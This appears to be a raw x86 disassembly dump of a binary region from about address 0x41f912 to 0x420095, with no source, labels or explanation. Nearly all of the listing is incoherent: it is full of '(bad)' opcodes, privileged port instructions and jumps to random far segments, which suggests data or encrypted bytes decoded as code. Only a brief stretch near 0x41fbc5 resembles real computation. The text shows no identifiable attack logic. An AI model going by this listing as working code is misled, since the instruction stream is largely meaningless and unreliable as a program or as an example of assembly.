  41f912:	inc    eax
  41f913:	pop    esp
  41f914:	adc    eax,0xba57a000
  41f919:	push   cs
  41f91a:	sub    al,0x8
  41f91c:	aas    
  41f91d:	arpl   WORD PTR [eax+ecx*2+0x7a],bp
  41f921:	loope  0x41f8ec
  41f923:	add    BYTE PTR [ecx],cl
  41f925:	sub    al,BYTE PTR [ecx+0x3]
  41f928:	ret    
  41f929:	jg     0x41f8c4
  41f92b:	or     eax,0x96f56420
  41f930:	inc    ecx
  41f931:	mov    WORD PTR [edx-0x4c197384],gs
  41f937:	iret   
  41f938:	jle    0x41f979
  41f93a:	jae    0x41f922
  41f93c:	jo     0x41f8be
  41f93e:	(bad)  
  41f93f:	push   edx
  41f940:	out    0xfa,eax
  41f942:	call   0xfec8fe01
  41f947:	imul   BYTE PTR [edx+edi*4-0x4d]
  41f94b:	sbb    al,0xe7
  41f94d:	es mov ebp,edi
  41f950:	icebp  
  41f951:	xchg   esp,eax
  41f952:	stc    
  41f953:	out    dx,eax
  41f954:	lds    ebx,FWORD PTR [edi-0x3ff0ce6e]
  41f95a:	int3   
  41f95b:	dec    ecx
  41f95c:	mov    ds:0xfc1b9695,eax
  41f961:	dec    edx
  41f962:	mov    WORD PTR [edx],fs
  41f964:	repz xlat BYTE PTR ds:[ebx]
  41f966:	inc    ecx
  41f967:	inc    esi
  41f968:	lea    eax,[ecx-0xeb74a44]
  41f96e:	pop    es
  41f96f:	loope  0x41f9a6
  41f971:	or     eax,0xe1f760bf
  41f976:	scas   eax,DWORD PTR es:[edi]
  41f977:	push   es
  41f978:	pusha  
  41f979:	das    
  41f97a:	out    0x7d,al
  41f97c:	xor    cl,BYTE PTR [edx+0x36ba6b46]
  41f982:	ins    BYTE PTR es:[edi],dx
  41f983:	sub    BYTE PTR [esi+0x684895bd],bl
  41f989:	lahf   
  41f98a:	xor    eax,0xe9977033
  41f98f:	sub    eax,0x1d4f93c5
  41f994:	jmp    0x7d3ccbaa
  41f999:	or     dh,BYTE PTR [esi+0x58]
  41f99c:	sahf   
  41f99d:	int    0x67
  41f99f:	and    eax,DWORD PTR [esi]
  41f9a1:	pop    eax
  41f9a2:	pop    esi
  41f9a3:	xchg   DWORD PTR [ecx+0x6c06f924],edi
  41f9a9:	push   0x3789583f
  41f9ae:	inc    edi
  41f9af:	retf   
  41f9b0:	inc    ebx
  41f9b1:	pushf  
  41f9b2:	fcmovnbe st,st(1)
  41f9b4:	icebp  
  41f9b5:	outs   dx,BYTE PTR ds:[esi]
  41f9b6:	out    0xec,al
  41f9b8:	(bad)  
  41f9b9:	fsub   QWORD PTR [ecx-0x57]
  41f9bc:	arpl   bx,dx
  41f9be:	sub    al,al
  41f9c0:	in     eax,0xfe
  41f9c2:	fisttp WORD PTR [esi+esi*2-0x71]
  41f9c6:	fild   DWORD PTR [ecx]
  41f9c8:	mov    BYTE PTR [esi],dh
  41f9ca:	push   esp
  41f9cb:	mov    ecx,0xac965e3
  41f9d0:	xchg   esi,eax
  41f9d1:	cdq    
  41f9d2:	add    DWORD PTR [edi+0x64fd54a],edx
  41f9d8:	leave  
  41f9d9:	xchg   bl,al
  41f9db:	(bad)  
  41f9dc:	mov    dh,0xf2
  41f9de:	test   al,0x3d
  41f9e0:	out    dx,al
  41f9e1:	daa    
  41f9e2:	out    dx,al
  41f9e3:	jbe    0x41fa4d
  41f9e5:	mov    ebx,0xa18ca377
  41f9ea:	xor    al,0xe5
  41f9ec:	xchg   esi,eax
  41f9ed:	mov    ds:0x69452f63,al
  41f9f2:	ins    DWORD PTR es:[edi],dx
  41f9f3:	add    eax,0x1d13b052
  41f9f8:	or     ebp,DWORD PTR [esi-0x8]
  41f9fb:	addr16 adc al,0x4
  41f9fe:	in     eax,0xb3
  41fa00:	outs   dx,BYTE PTR ds:[esi]
  41fa01:	pop    edx
  41fa02:	xor    dl,BYTE PTR es:[ebx]
  41fa05:	shl    BYTE PTR [edi+0x3ce1d1ee],1
  41fa0b:	add    esp,DWORD PTR [edi]
  41fa0d:	iret   
  41fa0e:	jle    0x41f9d8
  41fa10:	sar    BYTE PTR [ebx],1
  41fa12:	xor    DWORD PTR [ecx-0x7],ebx
  41fa15:	test   DWORD PTR [edi+0x68e1fe9c],edx
  41fa1b:	jle    0x41fa14
  41fa1d:	push   edi
  41fa1e:	repz push esp
  41fa20:	out    0x15,eax
  41fa22:	ja     0x41fa4d
  41fa24:	lahf   
  41fa25:	retfw  0x9098
  41fa29:	das    
  41fa2a:	ror    dl,0x4f
  41fa2d:	(bad)  
  41fa2e:	fild   WORD PTR [ecx+0x59ce4852]
  41fa34:	inc    edi
  41fa35:	xor    cl,bl
  41fa37:	mov    dh,0xcb
  41fa39:	jecxz  0x41fa0e
  41fa3b:	adc    al,0x65
  41fa3d:	xchg   ecx,eax
  41fa3e:	mov    esi,0x983cd8db
  41fa43:	loopne 0x41fa3e
  41fa45:	adc    al,0xbe
  41fa47:	jle    0x41fa43
  41fa49:	mov    ch,0xae
  41fa4b:	enter  0xb618,0x13
  41fa4f:	ins    BYTE PTR es:[edi],dx
  41fa50:	jb     0x41f9f5
  41fa52:	cmp    eax,0x6283e893
  41fa57:	mov    ds:0x36e4ae70,eax
  41fa5c:	vpsrlw ymm3,ymm0,xmm5
  41fa60:	cmp    al,0x0
  41fa62:	lahf   
  41fa63:	adc    al,0xd0
  41fa65:	int3   
  41fa66:	and    edx,ecx
  41fa68:	fsub   DWORD PTR [edi+0x455566ce]
  41fa6e:	and    BYTE PTR [ecx-0x9],0x8c
  41fa72:	xchg   edx,eax
  41fa73:	jne    0x41fac5
  41fa75:	push   ebx
  41fa76:	mov    gs:0xbdcb3121,eax
  41fa7c:	(bad)  
  41fa7d:	or     eax,0x6493a9eb
  41fa82:	(bad)  
  41fa83:	jle    0x41faed
  41fa85:	adc    DWORD PTR gs:[esi+ebx*8+0x6afe4388],ecx
  41fa8d:	xchg   dh,bh
  41fa8f:	push   esi
  41fa90:	pop    ss
  41fa91:	cld    
  41fa92:	inc    ebx
  41fa93:	aad    0x24
  41fa95:	int    0x65
  41fa97:	daa    
  41fa98:	into   
  41fa99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa9a:	loopne 0x41fa24
  41fa9c:	fisubr WORD PTR cs:[ebx]
  41fa9f:	test   eax,0x6abb09d
  41faa4:	sub    edx,DWORD PTR [ecx+0x69]
  41faa7:	fcomi  st,st(6)
  41faa9:	test   eax,0x471b8c32
  41faae:	test   dh,dl
  41fab0:	fistp  DWORD PTR [ecx]
  41fab2:	aad    0xab
  41fab4:	cmp    BYTE PTR [ecx-0x59],ch
  41fab7:	scas   al,BYTE PTR es:[edi]
  41fab8:	ret    0xab9f
  41fabb:	add    al,0x67
  41fabd:	jmp    0x8e10:0xe0fa6550
  41fac4:	pushf  
  41fac5:	in     al,dx
  41fac6:	mov    edi,0xe4dbd2f7
  41facb:	fs loopne 0x41fb43
  41face:	rol    esi,cl
  41fad0:	xchg   edi,eax
  41fad1:	cmp    eax,0x31e662ae
  41fad6:	shl    DWORD PTR [edx+0x50611a3a],1
  41fadc:	push   esi
  41fadd:	adc    DWORD PTR [esi+0x16196e2a],ebp
  41fae3:	xchg   BYTE PTR [edi-0x1c],dl
  41fae6:	ss ins BYTE PTR es:[edi],dx
  41fae8:	nop
  41fae9:	and    ch,ah
  41faeb:	out    dx,al
  41faec:	repnz pop esi
  41faee:	mov    edi,0xf2b02d51
  41faf3:	add    eax,0x62a0b5ce
  41faf8:	mov    edi,0x2e964947
  41fafd:	inc    edx
  41fafe:	mov    dl,0xb3
  41fb00:	push   edx
  41fb01:	stc    
  41fb02:	inc    DWORD PTR [ebp-0x3d]
  41fb05:	fstp   QWORD PTR [esi+0x4e4a48b7]
  41fb0b:	ret    0x146e
  41fb0e:	or     bl,bh
  41fb10:	fild   WORD PTR [ebp+0x4d5cd324]
  41fb16:	stos   BYTE PTR es:[edi],al
  41fb17:	dec    ecx
  41fb18:	sub    ah,BYTE PTR [eax-0x79]
  41fb1b:	arpl   WORD PTR [edi+esi*4-0x7d],ax
  41fb1f:	test   eax,ebx
  41fb21:	xor    eax,0xd9840865
  41fb26:	into   
  41fb27:	lock shr DWORD PTR [ebx+0x5739ff28],cl
  41fb2e:	test   BYTE PTR [esi-0x41],dh
  41fb31:	rcr    DWORD PTR [ecx-0x78bd5735],1
  41fb37:	mov    ah,0xea
  41fb39:	push   ds
  41fb3a:	mov    ds:0xf45beb80,al
  41fb3f:	cmp    bh,dh
  41fb41:	out    dx,eax
  41fb42:	inc    edi
  41fb43:	js     0x41fb13
  41fb45:	pusha  
  41fb46:	jle    0x41fb01
  41fb48:	daa    
  41fb49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb4a:	add    bl,BYTE PTR [ecx*4+0x32e2034c]
  41fb51:	pop    ds
  41fb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb53:	std    
  41fb54:	arpl   ax,bx
  41fb56:	lock pop ds
  41fb58:	sub    DWORD PTR [edi+ebx*2],ebp
  41fb5b:	pop    ebx
  41fb5c:	ins    BYTE PTR es:[edi],dx
  41fb5d:	enter  0x28fe,0x30
  41fb61:	mov    dh,0xcd
  41fb63:	dec    ebx
  41fb64:	push   ss
  41fb65:	ins    BYTE PTR es:[edi],dx
  41fb66:	sbb    BYTE PTR [esi-0x36],bl
  41fb69:	or     DWORD PTR [ebp-0x7c],ecx
  41fb6c:	(bad)  
  41fb6d:	push   cs
  41fb6e:	stos   DWORD PTR es:[edi],eax
  41fb6f:	ins    DWORD PTR es:[edi],dx
  41fb70:	jne    0x41fb4f
  41fb72:	(bad)  
  41fb73:	je     0x41fb1b
  41fb75:	mov    ?,WORD PTR [ebp+0x60e7ceca]
  41fb7b:	cmc    
  41fb7c:	push   ebx
  41fb7d:	xchg   esp,ebx
  41fb7f:	or     al,BYTE PTR [edi+0x37f8808f]
  41fb85:	into   
  41fb86:	jge    0x41fb0c
  41fb88:	add    DWORD PTR [eax-0x5a],ecx
  41fb8b:	mov    ds:0x8c1dfc98,eax
  41fb90:	mov    ch,0x10
  41fb92:	xchg   edx,eax
  41fb93:	fcomp  QWORD PTR [ebx-0x5c99f999]
  41fb99:	in     al,0x17
  41fb9b:	push   es
  41fb9c:	adc    esp,edx
  41fb9e:	or     al,0x63
  41fba0:	nop
  41fba1:	xchg   BYTE PTR [edi],ah
  41fba3:	mov    dl,BYTE PTR [ecx-0x12cd5e1c]
  41fba9:	imul   edx,DWORD PTR [esi],0xffffffae
  41fbac:	xchg   BYTE PTR [edi],al
  41fbae:	mov    al,ds:0x7185e159
  41fbb3:	bound  edx,QWORD PTR [edx+esi*8]
  41fbb6:	sbb    BYTE PTR [edi+0x7a428c66],ch
  41fbbc:	mov    eax,ds:0xb2f17bd
  41fbc1:	retf   0x4d89
  41fbc4:	lods   al,BYTE PTR ds:[esi]
  41fbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbc8:	mov    edx,DWORD PTR [ebp-0x50]
  41fbcb:	add    ecx,0x242ebc9
  41fbd1:	xor    ecx,edx
  41fbd3:	mov    DWORD PTR [ebp-0x50],ecx
  41fbd6:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbd9:	mov    edx,DWORD PTR [ebp-0x4c]
  41fbdc:	add    ecx,edi
  41fbde:	and    ecx,edx
  41fbe0:	mov    DWORD PTR [ebp-0x4c],ecx
  41fbe3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbe6:	mov    edx,DWORD PTR [ebp-0x48]
  41fbe9:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41fbf0:	mov    DWORD PTR [ebp-0x48],ecx
  41fbf3:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf6:	mov    edx,0xfa5e1524
  41fbfb:	sub    edx,ecx
  41fbfd:	add    edx,DWORD PTR [ebp-0x44]
  41fc00:	mov    DWORD PTR [ebp-0x44],edx
  41fc03:	mov    ecx,DWORD PTR [ebp+0x8]
  41fc06:	xor    ecx,eax
  41fc08:	add    ecx,esi
  41fc0a:	jne    0x41b4d1
  41fc10:	jmp    0x422001
  41fc15:	jmp    0x421f74
  41fc1a:	fistp  QWORD PTR [ecx+edi*4-0x13]
  41fc1e:	call   0xd5d8:0xbe4a8faa
  41fc25:	fs xchg esp,eax
  41fc27:	mov    dl,0x24
  41fc29:	stos   DWORD PTR es:[edi],eax
  41fc2a:	imul   esi,DWORD PTR [edi+0x5e3d837c],0x78568383
  41fc34:	sbb    dl,cl
  41fc36:	add    esp,DWORD PTR [edx-0x25]
  41fc39:	shl    DWORD PTR [esi+0x1e76cf65],1
  41fc3f:	pop    ds
  41fc40:	lods   eax,DWORD PTR ds:[esi]
  41fc41:	aaa    
  41fc42:	push   ebp
  41fc43:	test   eax,0x3d773b3c
  41fc48:	xchg   edx,eax
  41fc49:	xchg   ebx,eax
  41fc4a:	and    al,0x3b
  41fc4c:	test   eax,0xf85e4124
  41fc51:	xor    eax,0x7b70a5c1
  41fc56:	or     esi,ecx
  41fc58:	(bad)  
  41fc59:	mov    eax,ds:0xc1e0ff43
  41fc5e:	cmp    al,0x4b
  41fc60:	mov    cl,0x3b
  41fc62:	fidivr WORD PTR [ecx+0x7e]
  41fc65:	cmp    edi,esp
  41fc67:	(bad)  
  41fc68:	cmp    edi,edi
  41fc6a:	cmp    al,0x44
  41fc6c:	aaa    
  41fc6d:	adc    DWORD PTR [ebx-0x4cf6f723],esp
  41fc73:	lods   eax,DWORD PTR ds:[esi]
  41fc74:	lea    eax,[edi]
  41fc76:	es repz dec ebp
  41fc79:	(bad)  
  41fc7a:	lea    ebp,[edi+0x3b]
  41fc7d:	add    al,0x36
  41fc7f:	hlt    
  41fc80:	out    0xf6,eax
  41fc82:	xor    esi,ecx
  41fc84:	fsub   QWORD PTR [ebx+0x3df1dba7]
  41fc8a:	out    0x67,al
  41fc8c:	xor    DWORD PTR [ebp-0x17],ebx
  41fc8f:	imul   eax,DWORD PTR [edi-0x52759301],0x42
  41fc96:	daa    
  41fc97:	jo     0x41fc4f
  41fc99:	jle    0x41fc83
  41fc9b:	and    cl,BYTE PTR [esi+0x9]
  41fc9e:	rcr    BYTE PTR [edi+edi*8],1
  41fca1:	sti    
  41fca2:	leave  
  41fca3:	sbb    cl,BYTE PTR [edi+ebx*8-0x16]
  41fca7:	mov    bh,0xe2
  41fca9:	out    dx,al
  41fcaa:	cmp    DWORD PTR [eax+0x32],edx
  41fcad:	shl    ah,0x1b
  41fcb0:	enter  0xef6,0x8c
  41fcb4:	dec    ebx
  41fcb5:	in     al,dx
  41fcb6:	inc    esp
  41fcb7:	mov    eax,0x5f915e
  41fcbc:	xchg   ch,bl
  41fcbe:	enter  0x8ed0,0x91
  41fcc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcc3:	out    dx,al
  41fcc4:	adc    eax,0x760a7d92
  41fcc9:	(bad)  
  41fccb:	sbb    eax,0x6fbe1378
  41fcd0:	sub    bl,BYTE PTR [ecx+0x53]
  41fcd3:	pop    ebp
  41fcd4:	push   0x25d0c6b5
  41fcd9:	mov    al,ds:0x3c20206d
  41fcde:	cs pusha 
  41fce0:	repz mov ah,0xfc
  41fce3:	rcl    BYTE PTR [edi],0x78
  41fce6:	adc    BYTE PTR [esi-0x2b],cl
  41fce9:	pushf  
  41fcea:	mov    esp,0x3e14f3c7
  41fcef:	xor    esp,DWORD PTR [esi+edx*4]
  41fcf2:	mov    ds:0xd1cd5e40,al
  41fcf7:	xchg   edi,eax
  41fcf8:	into   
  41fcf9:	mov    ch,0x3b
  41fcfb:	fist   DWORD PTR [ebx+0x1d]
  41fcfe:	mov    dl,BYTE PTR [edx]
  41fd00:	xor    BYTE PTR [edi-0x485d11d1],ch
  41fd06:	mov    esi,0x6fea458d
  41fd0b:	mov    edi,0xf470eda0
  41fd10:	lahf   
  41fd11:	push   ebx
  41fd12:	enter  0x9c5c,0x49
  41fd16:	pop    es
  41fd17:	sar    bh,0x9
  41fd1a:	pop    esi
  41fd1b:	add    ch,ah
  41fd1d:	sub    ebp,esi
  41fd1f:	lahf   
  41fd20:	xchg   edx,eax
  41fd21:	int    0xbc
  41fd23:	adc    eax,0x1cdaeed0
  41fd28:	pop    ds
  41fd29:	fidivr WORD PTR [edi]
  41fd2b:	pop    es
  41fd2c:	std    
  41fd2d:	jmp    0xd6fcd00d
  41fd32:	mov    eax,0x38f10442
  41fd37:	xchg   esp,eax
  41fd38:	jnp    0x41fd2a
  41fd3a:	push   0x14
  41fd3c:	xchg   ebp,eax
  41fd3d:	xor    ch,BYTE PTR [ebx+eax*4]
  41fd40:	out    0x58,eax
  41fd42:	dec    esp
  41fd43:	push   es
  41fd44:	mov    edi,DWORD PTR [ebp*1-0x739b4520]
  41fd4b:	jb     0x41fdb4
  41fd4d:	jb     0x41fd57
  41fd4f:	nop
  41fd50:	popf   
  41fd51:	ins    BYTE PTR es:[edi],dx
  41fd52:	fwait
  41fd53:	into   
  41fd54:	pushf  
  41fd55:	ficomp WORD PTR [eax+0x70]
  41fd58:	dec    edx
  41fd59:	xchg   ecx,eax
  41fd5a:	push   cs
  41fd5b:	test   DWORD PTR [esi],edi
  41fd5d:	je     0x41fd7b
  41fd5f:	dec    esi
  41fd60:	cmp    BYTE PTR [ebp-0xbb69f27],al
  41fd66:	shl    BYTE PTR [eax-0x7a],1
  41fd69:	ret    
  41fd6a:	mov    eax,ds:0x9f28ff38
  41fd6f:	ds inc ecx
  41fd71:	mov    esi,0x4bda3143
  41fd76:	jmp    0xd30e:0xf48dc6c
  41fd7d:	retf   
  41fd7e:	lea    ecx,[edi+0x77985342]
  41fd84:	mov    ecx,DWORD PTR [edi+0x25]
  41fd87:	adc    eax,0x2a039b78
  41fd8c:	sub    al,0x63
  41fd8e:	sub    al,0xf3
  41fd90:	pop    eax
  41fd91:	popf   
  41fd92:	pop    ecx
  41fd93:	mov    eax,ds:0x8eb993b6
  41fd98:	push   0x38
  41fd9a:	or     al,0x52
  41fd9c:	test   DWORD PTR [esi+0x2e],0x42cc144c
  41fda3:	xchg   edx,eax
  41fda4:	pop    ss
  41fda5:	cmp    eax,edx
  41fda7:	fsqrt  
  41fda9:	adc    al,0x64
  41fdab:	push   es
  41fdac:	jns    0x41fd48
  41fdae:	dec    ecx
  41fdaf:	(bad)  
  41fdb0:	repz sbb DWORD PTR [esi+0x69b4b19d],eax
  41fdb7:	lock fucomp st(2)
  41fdba:	cmp    bh,dl
  41fdbc:	xchg   ebx,eax
  41fdbd:	fistp  WORD PTR [ebp-0x63]
  41fdc0:	ret    0xb77a
  41fdc3:	scas   al,BYTE PTR es:[edi]
  41fdc4:	cli    
  41fdc5:	push   ecx
  41fdc6:	cwde   
  41fdc7:	cmp    al,0x59
  41fdc9:	mov    ds:0xb35ca389,al
  41fdce:	inc    esi
  41fdcf:	ror    DWORD PTR [esi+edi*1-0x57a3b1f0],0x89
  41fdd7:	in     eax,0xad
  41fdd9:	rcr    DWORD PTR [esi+0x67],0x96
  41fddd:	ret    
  41fdde:	jns    0x41fe50
  41fde0:	gs inc ebx
  41fde2:	(bad)  
  41fde3:	mov    bl,0x8
  41fde5:	adc    eax,0x2eeb4a73
  41fdea:	sbb    esp,DWORD PTR [ecx]
  41fdec:	aam    0xb3
  41fdee:	inc    esi
  41fdef:	sbb    eax,0x9c60a8b6
  41fdf4:	push   0xe
  41fdf6:	in     al,0x27
  41fdf8:	stos   BYTE PTR es:[edi],al
  41fdf9:	rcl    BYTE PTR ds:0xadf1594b,1
  41fdff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe00:	cwde   
  41fe01:	dec    eax
  41fe02:	push   cs
  41fe03:	loope  0x41fd8c
  41fe05:	mov    al,ds:0x2b23d7ed
  41fe0a:	cmp    ah,BYTE PTR [ecx+0x1f8e698e]
  41fe10:	leave  
  41fe11:	cli    
  41fe12:	mov    cl,0x6d
  41fe14:	lea    ebp,[ebp-0x16]
  41fe17:	in     eax,0x47
  41fe19:	xchg   edi,eax
  41fe1a:	call   0xb2464172
  41fe1f:	mov    al,ds:0x757139a8
  41fe24:	xor    al,0xf4
  41fe26:	jmp    0xdd3e:0x699854ff
  41fe2d:	dec    eax
  41fe2e:	jle    0x41fdfa
  41fe30:	(bad)
  41fe33:	out    0xe0,eax
  41fe35:	es xchg edx,eax
  41fe37:	test   esi,ebp
  41fe39:	xchg   esi,eax
  41fe3a:	test   BYTE PTR [eax-0x5f],cl
  41fe3d:	pop    ecx
  41fe3e:	xor    BYTE PTR [ebx+0x5d],bl
  41fe41:	adc    bl,al
  41fe43:	rol    ch,1
  41fe45:	div    bh
  41fe47:	inc    eax
  41fe48:	iret   
  41fe49:	add    DWORD PTR [ebp+0x35],ebx
  41fe4c:	add    BYTE PTR [eax-0x5a07cdf1],bh
  41fe52:	in     al,dx
  41fe53:	inc    esi
  41fe54:	int3   
  41fe55:	inc    edx
  41fe56:	add    DWORD PTR [ecx],ecx
  41fe58:	mov    ds:0x9c8115b9,al
  41fe5d:	pop    ds
  41fe5e:	sahf   
  41fe5f:	arpl   WORD PTR [ecx-0x650b844],di
  41fe65:	js     0x41fe4f
  41fe67:	sub    al,0x77
  41fe69:	add    eax,0xcdc4abe8
  41fe6e:	and    BYTE PTR [edi],bl
  41fe70:	jecxz  0x41feb0
  41fe72:	and    al,0xec
  41fe74:	adc    esp,DWORD PTR [edx+0x2a]
  41fe77:	ret    0xfa35
  41fe7a:	push   esp
  41fe7b:	cmc    
  41fe7c:	inc    esi
  41fe7d:	or     al,0xf
  41fe7f:	adc    ch,dl
  41fe81:	call   0xabe245a
  41fe86:	stc    
  41fe87:	call   0xfeca4c77
  41fe8c:	inc    edx
  41fe8d:	stos   DWORD PTR es:[edi],eax
  41fe8e:	fwait
  41fe8f:	test   DWORD PTR ss:[edi+edx*1-0x3b],eax
  41fe94:	add    al,0x47
  41fe96:	jns    0x41feab
  41fe98:	mov    eax,ds:0x58b65123
  41fe9d:	cli    
  41fe9e:	cmp    bh,BYTE PTR ds:0xf21bc0ff
  41fea4:	lds    edx,FWORD PTR [edi]
  41fea6:	push   es
  41fea7:	add    BYTE PTR [eax],0xb8
  41feaa:	pop    eax
  41feab:	dec    ecx
  41feac:	push   ds
  41fead:	lea    edi,[esi+esi*8-0xb0ca7f5]
  41feb4:	push   ebp
  41feb5:	or     DWORD PTR [eax-0x44e2bedd],esi
  41febb:	aas    
  41febc:	retf   
  41febd:	pop    ebp
  41febe:	dec    ecx
  41febf:	jbe    0x41feab
  41fec1:	lea    ebp,[eax]
  41fec3:	nop
  41fec4:	cmp    ebp,DWORD PTR [ebp-0x7ba3de32]
  41feca:	push   ecx
  41fecb:	push   ecx
  41fecc:	jo     0x41fe9f
  41fece:	imul   edx,DWORD PTR [ebx],0xfffffffe
  41fed1:	pop    ss
  41fed2:	sub    ebp,0xa4c4e7d4
  41fed8:	aam    0x3f
  41feda:	lds    esp,FWORD PTR [edx-0x20]
  41fedd:	retf   
  41fede:	imul   ebx,esp,0x3e
  41fee1:	add    ch,BYTE PTR [edi+eax*2+0x6eaa81a3]
  41fee8:	xchg   edi,eax
  41fee9:	mov    cl,0xc8
  41feeb:	add    BYTE PTR [ebx],bl
  41feed:	dec    eax
  41feee:	add    BYTE PTR [ecx],al
  41fef0:	xchg   ebp,eax
  41fef1:	cld    
  41fef2:	push   0x5f
  41fef4:	(bad)  
  41fef5:	sbb    eax,0xc7926448
  41fefa:	add    al,0x46
  41fefc:	ret    0xd621
  41feff:	jle    0x41fef5
  41ff01:	sbb    BYTE PTR ds:0x17d6d52e,0x83
  41ff08:	call   0x3bbd:0x2236b349
  41ff0f:	out    0xdc,al
  41ff11:	shl    al,cl
  41ff13:	sub    ebx,DWORD PTR [ebx]
  41ff15:	sub    BYTE PTR [eax-0x3a2696cf],bl
  41ff1b:	imul   ebx,DWORD PTR [esi],0xea7bb07
  41ff21:	adc    DWORD PTR [ebx-0x1525a2c6],ebx
  41ff27:	cmp    al,0xd2
  41ff29:	das    
  41ff2a:	mov    ah,0x5f
  41ff2c:	loop   0x41ff30
  41ff2e:	adc    ch,BYTE PTR [ebx]
  41ff30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff31:	imul   edx,ebp,0x8b464e7b
  41ff37:	xchg   esp,eax
  41ff38:	jge    0x41fed8
  41ff3a:	ror    edi,0xfd
  41ff3d:	mov    bp,0xd3e1
  41ff41:	stos   DWORD PTR es:[edi],eax
  41ff42:	or     DWORD PTR [esi-0x1c34552e],eax
  41ff48:	mov    WORD PTR [ecx-0x65],gs
  41ff4b:	mov    ebp,0x3df5dbd2
  41ff50:	cmp    edx,ebx
  41ff52:	sbb    eax,DWORD PTR [ecx]
  41ff54:	lods   eax,DWORD PTR ds:[esi]
  41ff55:	cwde   
  41ff56:	fdivr  DWORD PTR [ebp+0x60]
  41ff59:	mov    ds:0x81ae2af6,eax
  41ff5e:	pop    edx
  41ff5f:	pop    esi
  41ff60:	(bad)  
  41ff61:	imul   edx,DWORD PTR ds:0xc6ed7b3c,0x38
  41ff68:	dec    esi
  41ff69:	push   cs
  41ff6a:	mov    eax,ds:0xfe8354a6
  41ff6f:	mov    ecx,0x91717676
  41ff74:	adc    ah,BYTE PTR [ebp-0x411096be]
  41ff7a:	mov    DWORD PTR [edx-0x23de3336],edi
  41ff80:	sbb    al,0x47
  41ff82:	lahf   
  41ff83:	leave  
  41ff84:	push   0xffffffd6
  41ff86:	fwait
  41ff87:	clc    
  41ff88:	mov    ds:0xcd5c83a1,al
  41ff8d:	int    0x7b
  41ff8f:	test   BYTE PTR [ebp+0x27],0x8e
  41ff93:	aam    0xd4
  41ff95:	mov    BYTE PTR [esi],0x40
  41ff98:	jl     0x41ff76
  41ff9a:	aam    0xa2
  41ff9c:	(bad)  
  41ff9d:	shl    BYTE PTR [esi-0x78],0x6e
  41ffa1:	lods   eax,DWORD PTR ds:[esi]
  41ffa2:	adc    eax,0x1074d275
  41ffa7:	pop    eax
  41ffa8:	gs pop edi
  41ffaa:	outs   dx,DWORD PTR ds:[esi]
  41ffab:	(bad)  
  41ffac:	data16 fdivr QWORD PTR [ecx]
  41ffaf:	div    esi
  41ffb1:	adc    eax,0x91db8570
  41ffb6:	div    DWORD PTR [esi]
  41ffb8:	in     al,0x5b
  41ffba:	nop
  41ffbb:	(bad)  
  41ffbc:	cs jle 0x42002f
  41ffbf:	mov    ecx,0x388b62a8
  41ffc4:	cmp    BYTE PTR [eax+0x3c],ch
  41ffc7:	loope  0x420025
  41ffc9:	call   0xfff5151e
  41ffce:	out    dx,al
  41ffcf:	mov    dh,0xc6
  41ffd1:	rcr    DWORD PTR [ecx-0x782af15a],1
  41ffd7:	push   ebp
  41ffd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffd9:	cmp    al,0xe7
  41ffdb:	inc    eax
  41ffdc:	leave  
  41ffdd:	int3   
  41ffde:	leave  
  41ffdf:	xchg   edx,eax
  41ffe0:	rcr    BYTE PTR gs:[esi+0x4e],0x25
  41ffe5:	aad    0xdb
  41ffe7:	mov    cl,0x53
  41ffe9:	pop    ebx
  41ffea:	adc    al,0x84
  41ffec:	imul   eax,DWORD PTR ds:0xa9e23dcb,0x8eb6b89f
  41fff6:	pop    edi
  41fff7:	sub    edi,DWORD PTR [ecx+0xb4a774e]
  41fffd:	and    al,0xf6
  41ffff:	fisubr WORD PTR [edi]
  420001:	sbb    dh,bl
  420003:	cmc    
  420004:	jge    0x41ffe2
  420006:	icebp  
  420007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420008:	inc    esi
  420009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42000a:	mov    cl,BYTE PTR [ebx]
  42000c:	mov    BYTE PTR [ebp+0x6b74c9a1],cl
  420012:	xor    DWORD PTR [eax-0x42],eax
  420015:	adc    BYTE PTR [eax],dl
  420017:	or     eax,0x97bb72a5
  42001c:	add    eax,0x93df827c
  420021:	std    
  420022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420023:	retf   0x5f52
  420026:	dec    ebp
  420027:	ret    0x7c61
  42002a:	call   FWORD PTR [eax+0x2a]
  42002d:	lods   eax,DWORD PTR ds:[esi]
  42002e:	pop    eax
  42002f:	xor    edi,DWORD PTR [edi-0x38]
  420032:	es cld 
  420034:	and    eax,ebp
  420036:	sti    
  420037:	push   ebx
  420038:	cli    
  420039:	imul   ebx,edi,0x5a6802df
  42003f:	dec    esi
  420040:	inc    edi
  420041:	js     0x41ffc8
  420043:	imul   ebp,DWORD PTR ds:0x23884345,0xffffffc0
  42004a:	fs jge 0x4200bb
  42004d:	mov    bh,0x8c
  42004f:	and    ch,BYTE PTR [edx]
  420051:	adc    ecx,eax
  420053:	mov    DWORD PTR [edi+edi*2+0x48],ecx
  420057:	aad    0x3c
  420059:	out    0x2e,al
  42005b:	cwde   
  42005c:	adc    BYTE PTR ds:0xa41613d0,dh
  420062:	loope  0x4200a8
  420064:	dec    ebp
  420065:	lahf   
  420066:	ret    
  420067:	out    0x52,eax
  420069:	cdq    
  42006a:	dec    edx
  42006b:	ret    
  42006c:	clc    
  42006d:	loopne 0x42001c
  42006f:	push   ebx
  420070:	in     eax,dx
  420071:	in     eax,0xdf
  420073:	lods   eax,DWORD PTR ds:[esi]
  420074:	and    eax,0x77f92b10
  420079:	ss jno 0x4200b6
  42007c:	ret    0x7767
  42007f:	sahf   
  420080:	sub    al,0x5c
  420082:	mov    dh,0x4b
  420084:	add    al,0x5c
  420086:	mov    BYTE PTR [esi+edx*2-0x7c6a7067],ch
  42008d:	dec    edi
  42008e:	call   0x7c29:0x142f54e5
  420095:	es or  edi,esp
